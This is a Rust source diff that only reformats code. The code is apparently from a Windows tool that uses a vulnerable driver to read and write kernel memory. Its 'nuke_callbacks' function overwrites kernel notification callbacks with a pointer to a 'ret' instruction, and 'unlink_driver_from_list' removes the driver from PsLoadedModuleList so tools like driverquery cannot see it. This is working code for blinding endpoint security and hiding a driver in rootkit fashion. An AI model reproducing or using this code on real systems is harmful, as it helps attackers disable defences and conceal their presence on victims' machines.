@@ -63,9 +63,7 @@ unsafe fn read_kernel_memory(
     buffer: &mut [u8],
 ) -> Result<()> {
     if driver.needs_physical_addr {
-        let cr3_val = cr3.context(
-            "CR3 required for VA→PA translation with this driver",
-        )?;
+        let cr3_val = cr3.context("CR3 required for VA→PA translation with this driver")?;
         let phys = super::translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
         deploy::read_physical_memory(driver, device_handle, phys, buffer)
     } else {
@@ -86,9 +84,7 @@ unsafe fn write_kernel_memory(
     data: &[u8],
 ) -> Result<()> {
     if driver.needs_physical_addr {
-        let cr3_val = cr3.context(
-            "CR3 required for VA→PA translation with this driver",
-        )?;
+        let cr3_val = cr3.context("CR3 required for VA→PA translation with this driver")?;
         let phys = super::translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
         deploy::write_physical_memory(driver, device_handle, phys, data)
     } else {
@@ -146,14 +142,9 @@ fn find_ret_address(
         Ok(addr) => {
             // Verify it's actually a ret instruction.
             let mut buf = [0u8; 1];
-            match unsafe {
-                read_kernel_memory(driver, device_handle, cr3, addr, &mut buf)
-            } {
+            match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
                 Ok(()) if buf[0] == 0xC3 => {
-                    log::info!(
-                        "Found ret at IoInvalidDeviceRequest: 0x{:016X}",
-                        addr
-                    );
+                    log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                     return Ok(addr);
                 }
                 Ok(()) => {
@@ -190,7 +181,13 @@ fn find_ret_address(
 
     let mut pe_sig = [0u8; 4];
     unsafe {
-        read_kernel_memory(driver, device_handle, cr3, kernel_base + pe_offset, &mut pe_sig)?;
+        read_kernel_memory(
+            driver,
+            device_handle,
+            cr3,
+            kernel_base + pe_offset,
+            &mut pe_sig,
+        )?;
     }
 
     if &pe_sig != b"PE\0\0" {
@@ -364,8 +361,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
     let driver = deployed.driver;
 
     // Step 1: Scan for all callbacks.
-    let scan = super::discover::scan_callbacks(deployed)
-        .context("callback scan failed")?;
+    let scan = super::discover::scan_callbacks(deployed).context("callback scan failed")?;
 
     log::info!(
         "Discovered {} callbacks ({} overwritable), kernel base: 0x{:016X}",
@@ -386,8 +382,10 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
 
     // Step 2: Resolve CR3 if the driver needs physical addresses.
     let cr3 = if driver.needs_physical_addr {
-        Some(super::resolve_cr3(driver, device_handle, scan.kernel_base)
-            .context("failed to resolve CR3 for VA→PA translation")?)
+        Some(
+            super::resolve_cr3(driver, device_handle, scan.kernel_base)
+                .context("failed to resolve CR3 for VA→PA translation")?,
+        )
     } else {
         None
     };
@@ -442,10 +440,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
                 result.overwritten += 1;
                 result.details.push(format!(
                     "NUKE {}:{} [{}] 0x{:016X} -> ret",
-                    callback.list_type,
-                    callback.index,
-                    callback.owner_module,
-                    original_value
+                    callback.list_type, callback.index, callback.owner_module, original_value
                 ));
             }
             Err(e) => {
@@ -453,10 +448,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
                 result.failed += 1;
                 result.details.push(format!(
                     "FAIL {}:{} [{}]: {}",
-                    callback.list_type,
-                    callback.index,
-                    callback.owner_module,
-                    e
+                    callback.list_type, callback.index, callback.owner_module, e
                 ));
                 log::warn!(
                     "Failed to overwrite callback {}:{}: {}",
@@ -502,8 +494,10 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
     let cr3 = if driver.needs_physical_addr {
         let scan = super::discover::scan_callbacks(deployed).ok();
         if let Some(scan) = scan {
-            Some(super::resolve_cr3(driver, device_handle, scan.kernel_base)
-                .context("failed to resolve CR3 for VA→PA translation")?)
+            Some(
+                super::resolve_cr3(driver, device_handle, scan.kernel_base)
+                    .context("failed to resolve CR3 for VA→PA translation")?,
+            )
         } else {
             bail!("Cannot resolve CR3: callback scan failed during restore");
         }
@@ -525,13 +519,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
         // Write the original value back.
         let original_bytes = backup.original_value.to_le_bytes();
         match unsafe {
-            write_kernel_memory(
-                driver,
-                device_handle,
-                cr3,
-                backup.address,
-                &original_bytes,
-            )
+            write_kernel_memory(driver, device_handle, cr3, backup.address, &original_bytes)
         } {
             Ok(()) => {
                 result.restored += 1;
@@ -579,10 +567,12 @@ pub fn get_backup_snapshot() -> Vec<CallbackBackup> {
 /// loaded module list, making it invisible to tools like `driverquery`
 /// and `EnumDeviceDrivers`. The driver remains loaded in kernel memory
 /// and continues to function.
-fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Option<u64>) -> Result<()> {
-    let device_handle = deployed
-        .device_handle
-        .context("No device handle")?;
+fn unlink_driver_from_list(
+    deployed: &DeployedDriver,
+    kernel_base: u64,
+    cr3: Option<u64>,
+) -> Result<()> {
+    let device_handle = deployed.device_handle.context("No device handle")?;
     let driver = deployed.driver;
 
     // Resolve PsLoadedModuleList.
@@ -618,13 +608,7 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Opt
         // UNICODE_STRING: Length (u16), MaxLength (u16), Buffer (ptr)
         let mut name_info = [0u8; 16]; // UNICODE_STRING + pointer
         unsafe {
-            read_kernel_memory(
-                driver,
-                device_handle,
-                cr3,
-                current + 0x58,
-                &mut name_info,
-            )?;
+            read_kernel_memory(driver, device_handle, cr3, current + 0x58, &mut name_info)?;
         }
 
         let name_length = u16::from_le_bytes(name_info[0..2].try_into()?) as usize;
@@ -633,13 +617,7 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Opt
         if name_length > 0 && name_buffer != 0 {
             let mut name_buf = vec![0u8; name_length + 2];
             unsafe {
-                read_kernel_memory(
-                    driver,
-                    device_handle,
-                    cr3,
-                    name_buffer,
-                    &mut name_buf,
-                )?;
+                read_kernel_memory(driver, device_handle, cr3, name_buffer, &mut name_buf)?;
             }
 
             // Convert from UTF-16 to string.
@@ -654,13 +632,7 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Opt
                 // Read Flink and Blink of this entry.
                 let mut entry_links = [0u8; 16];
                 unsafe {
-                    read_kernel_memory(
-                        driver,
-                        device_handle,
-                        cr3,
-                        current,
-                        &mut entry_links,
-                    )?;
+                    read_kernel_memory(driver, device_handle, cr3, current, &mut entry_links)?;
                 }
                 let entry_flink = u64::from_le_bytes(entry_links[0..8].try_into()?);
                 let entry_blink = u64::from_le_bytes(entry_links[8..16].try_into()?);
@@ -668,31 +640,16 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Opt
                 // Set blink->Flink = flink.
                 let flink_bytes = entry_flink.to_le_bytes();
                 unsafe {
-                    write_kernel_memory(
-                        driver,
-                        device_handle,
-                        cr3,
-                        entry_blink,
-                        &flink_bytes,
-                    )?;
+                    write_kernel_memory(driver, device_handle, cr3, entry_blink, &flink_bytes)?;
                 }
 
                 // Set flink->Blink = blink.
                 let blink_bytes = entry_blink.to_le_bytes();
                 unsafe {
-                    write_kernel_memory(
-                        driver,
-                        device_handle,
-                        cr3,
-                        entry_flink + 8,
-                        &blink_bytes,
-                    )?;
+                    write_kernel_memory(driver, device_handle, cr3, entry_flink + 8, &blink_bytes)?;
                 }
 
-                log::info!(
-                    "Unlinked {} from PsLoadedModuleList",
-                    driver.name
-                );
+                log::info!("Unlinked {} from PsLoadedModuleList", driver.name);
                 return Ok(());
             }
         }
